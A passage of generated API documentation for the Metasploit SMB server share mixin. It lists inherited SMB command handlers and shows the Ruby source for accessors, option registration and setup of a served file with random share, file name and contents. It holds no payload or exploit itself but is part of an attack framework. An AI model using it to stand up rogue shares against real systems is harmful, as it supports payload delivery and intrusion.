      <a href="#unc-instance_method" title="#unc (instance method)">- (Object) <strong>unc</strong> </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Builds the UNC Name for the shared file.</p>
</div></span>
  
</li>

      
    </ul>
  


  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="../Server.html" title="Msf::Exploit::Remote::SMB::Server (module)">Msf::Exploit::Remote::SMB::Server</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../Server.html#on_client_close-instance_method" title="Msf::Exploit::Remote::SMB::Server#on_client_close (method)">#on_client_close</a></span>, <span class='object_link'><a href="../Server.html#on_client_connect-instance_method" title="Msf::Exploit::Remote::SMB::Server#on_client_connect (method)">#on_client_connect</a></span>, <span class='object_link'><a href="../Server.html#on_client_data-instance_method" title="Msf::Exploit::Remote::SMB::Server#on_client_data (method)">#on_client_data</a></span>, <span class='object_link'><a href="../Server.html#smb_error-instance_method" title="Msf::Exploit::Remote::SMB::Server#smb_error (method)">#smb_error</a></span>, <span class='object_link'><a href="../Server.html#smb_pool_update-instance_method" title="Msf::Exploit::Remote::SMB::Server#smb_pool_update (method)">#smb_pool_update</a></span>, <span class='object_link'><a href="../Server.html#smb_recv-instance_method" title="Msf::Exploit::Remote::SMB::Server#smb_recv (method)">#smb_recv</a></span>, <span class='object_link'><a href="../Server.html#smb_set_defaults-instance_method" title="Msf::Exploit::Remote::SMB::Server#smb_set_defaults (method)">#smb_set_defaults</a></span>, <span class='object_link'><a href="../Server.html#smb_stop-instance_method" title="Msf::Exploit::Remote::SMB::Server#smb_stop (method)">#smb_stop</a></span></p>

  
  
  
  
  
  
  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="../../TcpServer.html" title="Msf::Exploit::Remote::TcpServer (module)">TcpServer</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="../../TcpServer.html#cleanup-instance_method" title="Msf::Exploit::Remote::TcpServer#cleanup (method)">#cleanup</a></span>, <span class='object_link'><a href="../../TcpServer.html#exploit-instance_method" title="Msf::Exploit::Remote::TcpServer#exploit (method)">#exploit</a></span>, <span class='object_link'><a href="../../TcpServer.html#on_client_close-instance_method" title="Msf::Exploit::Remote::TcpServer#on_client_close (method)">#on_client_close</a></span>, <span class='object_link'><a href="../../TcpServer.html#on_client_connect-instance_method" title="Msf::Exploit::Remote::TcpServer#on_client_connect (method)">#on_client_connect</a></span>, <span class='object_link'><a href="../../TcpServer.html#on_client_data-instance_method" title="Msf::Exploit::Remote::TcpServer#on_client_data (method)">#on_client_data</a></span>, <span class='object_link'><a href="../../TcpServer.html#primer-instance_method" title="Msf::Exploit::Remote::TcpServer#primer (method)">#primer</a></span>, <span class='object_link'><a href="../../TcpServer.html#regenerate_payload-instance_method" title="Msf::Exploit::Remote::TcpServer#regenerate_payload (method)">#regenerate_payload</a></span>, <span class='object_link'><a href="../../TcpServer.html#srvport-instance_method" title="Msf::Exploit::Remote::TcpServer#srvport (method)">#srvport</a></span>, <span class='object_link'><a href="../../TcpServer.html#ssl-instance_method" title="Msf::Exploit::Remote::TcpServer#ssl (method)">#ssl</a></span>, <span class='object_link'><a href="../../TcpServer.html#ssl_cert-instance_method" title="Msf::Exploit::Remote::TcpServer#ssl_cert (method)">#ssl_cert</a></span>, <span class='object_link'><a href="../../TcpServer.html#ssl_compression-instance_method" title="Msf::Exploit::Remote::TcpServer#ssl_compression (method)">#ssl_compression</a></span>, <span class='object_link'><a href="../../TcpServer.html#start_service-instance_method" title="Msf::Exploit::Remote::TcpServer#start_service (method)">#start_service</a></span>, <span class='object_link'><a href="../../TcpServer.html#stop_service-instance_method" title="Msf::Exploit::Remote::TcpServer#stop_service (method)">#stop_service</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/InformationLevel/Query.html" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query (module)">InformationLevel::Query</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/InformationLevel/Query.html#send_info_basic_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#send_info_basic_res (method)">#send_info_basic_res</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html#send_info_network_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#send_info_network_res (method)">#send_info_network_res</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html#send_info_standard_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#send_info_standard_res (method)">#send_info_standard_res</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html#smb_cmd_trans_query_file_info_basic-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#smb_cmd_trans_query_file_info_basic (method)">#smb_cmd_trans_query_file_info_basic</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html#smb_cmd_trans_query_file_info_standard-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#smb_cmd_trans_query_file_info_standard (method)">#smb_cmd_trans_query_file_info_standard</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html#smb_cmd_trans_query_path_info_basic-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#smb_cmd_trans_query_path_info_basic (method)">#smb_cmd_trans_query_path_info_basic</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html#smb_cmd_trans_query_path_info_network-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#smb_cmd_trans_query_path_info_network (method)">#smb_cmd_trans_query_path_info_network</a></span>, <span class='object_link'><a href="Share/InformationLevel/Query.html#smb_cmd_trans_query_path_info_standard-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Query#smb_cmd_trans_query_path_info_standard (method)">#smb_cmd_trans_query_path_info_standard</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/InformationLevel/Find.html" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find (module)">InformationLevel::Find</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/InformationLevel/Find.html#send_find_file_both_directory_info_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find#send_find_file_both_directory_info_res (method)">#send_find_file_both_directory_info_res</a></span>, <span class='object_link'><a href="Share/InformationLevel/Find.html#send_find_file_names_info_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find#send_find_file_names_info_res (method)">#send_find_file_names_info_res</a></span>, <span class='object_link'><a href="Share/InformationLevel/Find.html#send_find_full_directory_info_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find#send_find_full_directory_info_res (method)">#send_find_full_directory_info_res</a></span>, <span class='object_link'><a href="Share/InformationLevel/Find.html#smb_cmd_find_file_both_directory_info-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find#smb_cmd_find_file_both_directory_info (method)">#smb_cmd_find_file_both_directory_info</a></span>, <span class='object_link'><a href="Share/InformationLevel/Find.html#smb_cmd_find_file_full_directory_info-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find#smb_cmd_find_file_full_directory_info (method)">#smb_cmd_find_file_full_directory_info</a></span>, <span class='object_link'><a href="Share/InformationLevel/Find.html#smb_cmd_find_file_names_info-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::InformationLevel::Find#smb_cmd_find_file_names_info (method)">#smb_cmd_find_file_names_info</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/Trans2/QueryPathInformation.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::QueryPathInformation (module)">Command::Trans2::QueryPathInformation</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/Trans2/QueryPathInformation.html#smb_cmd_trans2_query_path_information-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::QueryPathInformation#smb_cmd_trans2_query_path_information (method)">#smb_cmd_trans2_query_path_information</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/Trans2/QueryFileInformation.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::QueryFileInformation (module)">Command::Trans2::QueryFileInformation</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/Trans2/QueryFileInformation.html#smb_cmd_trans2_query_file_information-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::QueryFileInformation#smb_cmd_trans2_query_file_information (method)">#smb_cmd_trans2_query_file_information</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/Trans2/FindFirst2.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::FindFirst2 (module)">Command::Trans2::FindFirst2</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/Trans2/FindFirst2.html#smb_cmd_trans2_find_first2-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2::FindFirst2#smb_cmd_trans2_find_first2 (method)">#smb_cmd_trans2_find_first2</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/Trans2.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2 (module)">Command::Trans2</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/Trans2.html#normalize_path-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2#normalize_path (method)">#normalize_path</a></span>, <span class='object_link'><a href="Share/Command/Trans2.html#send_trans2_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2#send_trans2_res (method)">#send_trans2_res</a></span>, <span class='object_link'><a href="Share/Command/Trans2.html#smb_cmd_trans2-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2#smb_cmd_trans2 (method)">#smb_cmd_trans2</a></span>, <span class='object_link'><a href="Share/Command/Trans2.html#smb_expand-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Trans2#smb_expand (method)">#smb_expand</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/SessionSetupAndx.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::SessionSetupAndx (module)">Command::SessionSetupAndx</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/SessionSetupAndx.html#send_session_setup_andx_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::SessionSetupAndx#send_session_setup_andx_res (method)">#send_session_setup_andx_res</a></span>, <span class='object_link'><a href="Share/Command/SessionSetupAndx.html#smb_cmd_session_setup_andx-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::SessionSetupAndx#smb_cmd_session_setup_andx (method)">#smb_cmd_session_setup_andx</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/ReadAndx.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::ReadAndx (module)">Command::ReadAndx</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/ReadAndx.html#send_read_andx_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::ReadAndx#send_read_andx_res (method)">#send_read_andx_res</a></span>, <span class='object_link'><a href="Share/Command/ReadAndx.html#smb_cmd_read_andx-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::ReadAndx#smb_cmd_read_andx (method)">#smb_cmd_read_andx</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/NtCreateAndx.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::NtCreateAndx (module)">Command::NtCreateAndx</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/NtCreateAndx.html#send_nt_create_andx_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::NtCreateAndx#send_nt_create_andx_res (method)">#send_nt_create_andx_res</a></span>, <span class='object_link'><a href="Share/Command/NtCreateAndx.html#smb_cmd_nt_create_andx-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::NtCreateAndx#smb_cmd_nt_create_andx (method)">#smb_cmd_nt_create_andx</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/Negotiate.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Negotiate (module)">Command::Negotiate</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/Negotiate.html#send_negotitate_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Negotiate#send_negotitate_res (method)">#send_negotitate_res</a></span>, <span class='object_link'><a href="Share/Command/Negotiate.html#smb_cmd_negotiate-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Negotiate#smb_cmd_negotiate (method)">#smb_cmd_negotiate</a></span></p>

  
  
  
  
  
  
  
  
  <h3 class="inherited">Methods included from <span class='object_link'><a href="Share/Command/Close.html" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Close (module)">Command::Close</a></span></h3>
  <p class="inherited"><span class='object_link'><a href="Share/Command/Close.html#send_close_res-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Close#send_close_res (method)">#send_close_res</a></span>, <span class='object_link'><a href="Share/Command/Close.html#smb_cmd_close-instance_method" title="Msf::Exploit::Remote::SMB::Server::Share::Command::Close#smb_cmd_close (method)">#smb_cmd_close</a></span></p>

  <div id="instance_attr_details" class="attr_details">
    <h2>Instance Attribute Details</h2>
    
      
      <span id="file_contents=-instance_method"></span>
      <div class="method_details first">
  <h3 class="signature first" id="file_contents-instance_method">
  
    - (<tt>String</tt>) <strong>file_contents</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns The contents of the provided file</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The contents of the provided file</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


192
193
194</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/smb/server/share.rb', line 192</span>

<span class='kw'>def</span> <span class='id identifier rubyid_file_contents'>file_contents</span>
  <span class='ivar'>@file_contents</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="file_name=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="file_name-instance_method">
  
    - (<tt>String</tt>) <strong>file_name</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns The file name of the provided UNC.</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The file name of the provided UNC.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


183
184
185</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/smb/server/share.rb', line 183</span>

<span class='kw'>def</span> <span class='id identifier rubyid_file_name'>file_name</span>
  <span class='ivar'>@file_name</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="folder_name=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="folder_name-instance_method">
  
    - (<tt>String</tt>) <strong>folder_name</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns The folder where the provided file lives.</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The folder where the provided file lives.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


180
181
182</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/smb/server/share.rb', line 180</span>

<span class='kw'>def</span> <span class='id identifier rubyid_folder_name'>folder_name</span>
  <span class='ivar'>@folder_name</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="hi=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="hi-instance_method">
  
    - (<tt>Fixnum</tt>) <strong>hi</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns The high 4 bytes for the file &#39;created time&#39;.</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>Fixnum</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The high 4 bytes for the file &#39;created time&#39;.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


186
187
188</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/smb/server/share.rb', line 186</span>

<span class='kw'>def</span> <span class='id identifier rubyid_hi'>hi</span>
  <span class='ivar'>@hi</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="lo=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="lo-instance_method">
  
    - (<tt>Fixnum</tt>) <strong>lo</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns The low 4 bytes for the file &#39;created time&#39;.</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>Fixnum</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The low 4 bytes for the file &#39;created time&#39;.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


189
190
191</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/smb/server/share.rb', line 189</span>

<span class='kw'>def</span> <span class='id identifier rubyid_lo'>lo</span>
  <span class='ivar'>@lo</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      
      <span id="share=-instance_method"></span>
      <div class="method_details ">
  <h3 class="signature " id="share-instance_method">
  
    - (<tt>String</tt>) <strong>share</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Returns The share portion of the provided UNC.</p>


  </div>
</div>
<div class="tags">
  
<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The share portion of the provided UNC.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


177
178
179</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/smb/server/share.rb', line 177</span>

<span class='kw'>def</span> <span class='id identifier rubyid_share'>share</span>
  <span class='ivar'>@share</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
  </div>


  <div id="instance_method_details" class="method_details_list">
    <h2>Instance Method Details</h2>

    
      <div class="method_details first">
  <h3 class="signature first" id="get_file_contents-instance_method">
  
    - (<tt>String</tt>) <strong>get_file_contents</strong>(client:, file: &#39;&#39;, folder: &#39;&#39;) 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
  <div class="note notetag">
    <strong>Note:</strong>
    <div class='inline'>
<p>This method will be useful when multiple files are supported. At the moment
is used to be overriden by modules. So they can customize the file
contents.</p>
</div>
  </div>


<p>Returns the file contents for the requested file</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>file</span>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>the requested file</p>
</div>
      
    </li>
  
    <li>
      
        <span class='name'>folder</span>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>the requested folder</p>
</div>
      
    </li>
  
</ul>

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The file contents.</p>
</div>
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


244
245
246</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/smb/server/share.rb', line 244</span>

<span class='kw'>def</span> <span class='id identifier rubyid_get_file_contents'>get_file_contents</span><span class='lparen'>(</span><span class='label'>client:</span><span class='comma'>,</span> <span class='label'>file:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='label'>folder:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
  <span class='id identifier rubyid_file_contents'>file_contents</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="initialize-instance_method">
  
    - (<tt>Object</tt>) <strong>initialize</strong>(info = {}) 
  

  

  
</h3><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


194
195
196
197
198
199
200
201
202
203
204</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/smb/server/share.rb', line 194</span>

<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='id identifier rubyid_info'>info</span> <span class='op'>=</span> <span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
  <span class='kw'>super</span>

  <span class='id identifier rubyid_register_options'>register_options</span><span class='lparen'>(</span>
    <span class='lbracket'>[</span>
      <span class='const'>OptString</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SHARE</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Share (Default Random)</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
      <span class='const'>OptString</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FILE_NAME</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>File name to share (Default Random)</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
      <span class='const'>OptString</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FOLDER_NAME</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Folder name to share (Default none)</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='comma'>,</span>
      <span class='const'>OptPath</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FILE_CONTENTS</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='lbracket'>[</span> <span class='kw'>false</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>File contents (Default Random)</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
    <span class='rbracket'>]</span><span class='comma'>,</span> <span class='const'>Msf</span><span class='op'>::</span><span class='const'>Exploit</span><span class='op'>::</span><span class='const'>Remote</span><span class='op'>::</span><span class='const'>SMB</span><span class='op'>::</span><span class='const'>Server</span><span class='op'>::</span><span class='const'>Share</span><span class='rparen'>)</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="setup-instance_method">
  
    - (<tt>Object</tt>) <strong>setup</strong> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Setups the server configuration.</p>


  </div>
</div>
<div class="tags">
  

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/core/exploit/smb/server/share.rb', line 207</span>

<span class='kw'>def</span> <span class='id identifier rubyid_setup'>setup</span>
  <span class='kw'>super</span>

  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_folder_name'>folder_name</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FOLDER_NAME</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_share'>share</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>SHARE</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='int'>4</span> <span class='op'>+</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>3</span><span class='rparen'>)</span><span class='rparen'>)</span>
  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_file_name'>file_name</span> <span class='op'>=</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FILE_NAME</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span> <span class='op'>||</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='int'>4</span> <span class='op'>+</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>3</span><span class='rparen'>)</span><span class='rparen'>)</span>

  <span class='id identifier rubyid_t'>t</span> <span class='op'>=</span> <span class='const'>Time</span><span class='period'>.</span><span class='id identifier rubyid_now'>now</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span>
  <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_hi'>hi</span><span class='comma'>,</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_lo'>lo</span> <span class='op'>=</span> <span class='op'>::</span><span class='const'>Rex</span><span class='op'>::</span><span class='const'>Proto</span><span class='op'>::</span><span class='const'>SMB</span><span class='op'>::</span><span class='const'>Utils</span><span class='period'>.</span><span class='id identifier rubyid_time_unix_to_smb'>time_unix_to_smb</span><span class='lparen'>(</span><span class='id identifier rubyid_t'>t</span><span class='rparen'>)</span>

  <span class='comment'># The module has an opportunity to set up the file contents in the &quot;primer callback&quot;
</span>  <span class='kw'>if</span> <span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FILE_CONTENTS</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
    <span class='const'>File</span><span class='period'>.</span><span class='id identifier rubyid_open'>open</span><span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>FILE_CONTENTS</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>rb</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span> <span class='lbrace'>{</span> <span class='op'>|</span><span class='id identifier rubyid_f'>f</span><span class='op'>|</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_file_contents'>file_contents</span> <span class='op'>=</span> <span class='id identifier rubyid_f'>f</span><span class='period'>.</span><span class='id identifier rubyid_read'>read</span> <span class='rbrace'>}</span>
  <span class='kw'>else</span>
    <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_file_contents'>file_contents</span> <span class='op'>=</span> <span class='const'>Rex</span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_rand_text_alpha'>rand_text_alpha</span><span class='lparen'>(</span><span class='int'>50</span> <span class='op'>+</span> <span class='id identifier rubyid_rand'>rand</span><span class='lparen'>(</span><span class='int'>150</span><span class='rparen'>)</span><span class='rparen'>)</span>
  <span class='kw'>end</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
